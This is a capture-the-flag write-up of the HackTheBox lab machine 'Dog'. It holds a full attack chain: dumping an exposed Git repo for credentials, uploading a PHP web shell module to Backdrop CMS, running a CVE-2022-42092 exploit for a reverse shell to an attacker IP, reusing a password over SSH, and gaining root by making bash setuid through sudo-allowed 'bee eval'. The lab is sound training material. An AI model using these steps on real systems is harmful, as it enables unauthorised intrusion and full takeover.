---
layout: writeup
name: "Dog"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/dog/
os: "Hack The Box"
date: 2025-11-12
pwned: true
---

# 🐾 Machine Name: `Dog`
![image (6)](https://github.com/user-attachments/assets/095e5de9-a81b-4e43-aed3-43678e99111c)

**Platform:** Hack The Box  
**IP Address:** `10.10.11.58`  
**Difficulty:** Easy Linux  

---

## 🧭 Overview

Dog is a well-designed box that focuses on web exploitation, Git enumeration, and privilege escalation through a misconfigured PHP utility. Key highlights include Git repository dumping, CMS exploitation (Backdrop CMS), user pivoting via SSH, and privesc via the `bee` PHP utility. This box also taught the value of using `pipx` for clean Python tool installation on Kali Linux.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- dog.htb --min-rate 10000
nmap -p 22,80 dog.htb -sCV -oN nmapscan
```

- Ports open: **22 (SSH)** and **80 (HTTP)**
- CMS detected: **Backdrop CMS**
- `.git/` repo exposed

---

## 🕵️ Web Enumeration

### robots.txt

```bash
curl http://dog.htb/robots.txt
```

- Many interesting disallowed paths → classic CMS footprint.

### Git Repo Dump

Used `pipx` to install `git-dumper` cleanly:

```bash
pipx install git-dumper
```

✅ Very important — `pipx` solved long-standing `pip` issues on Kali.

Dumped Git repo:

```bash
git-dumper http://dog.htb/.git/ dog-git
```

Extracted username + DB credentials:

```bash
tiffany@dog.htb
BackDropJ2024DS2024
```

---

## 🎯 Foothold

### CMS Login

- Used Git creds to login as `tiffany`.
- Found file upload feature → crafted **malicious module**:

```php
<?php
system($_GET['a']);
```

### RCE Achieved

- Confirmed module upload worked.
- Initial reverse shell failed → found CVE:

```text
CVE-2022-42092
https://github.com/ajdumanhug/CVE-2022-42092
```

Used POC:

```bash
python3 CVE-2022-42092.py http://dog.htb tiffany BackDropJ2024DS2024 10.10.14.26 9001
```

✅ Caught reverse shell as **www-data**.

---

## 🚀 Privilege Escalation

### User Pivot

- Discovered users:

```bash
/home/johncusack
/home/jobert
```

- SSH as `johncusack` → reused **DB password**:

```bash
ssh johncusack@dog.htb
```

User flag:

```bash
cat /home/johncusack/user.txt
```

### Privesc via `bee` Utility

- `sudo -l` revealed `sudo /usr/local/bin/bee` allowed.
- Abused bee’s `ev` / `eval` capability:

```bash
sudo /usr/local/bin/bee ev "system('whoami');"
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('chmod u+s /bin/bash');"
```

- Switched to **root** using setuid bash:

```bash
bash -p
whoami
root
cat /root/root.txt
```

---

## 🧠 Lessons Learned

- **pipx** is an excellent tool for managing Python-based pentest tools cleanly in Kali.
- Git repo enumeration remains highly valuable — `.git` often leaks sensitive data.
- CVE chaining is powerful — CMS → RCE → shell.
- Always check `sudo -l` — unusual utilities like `bee` can be leveraged for privesc.
- Maintaining a stable reverse shell while escalating is crucial (saved me when `bee` broke my initial shell).

---

*Writeup by inksec*  
GitHub: [https://github.com/inkedqt](https://github.com/inkedqt)

---
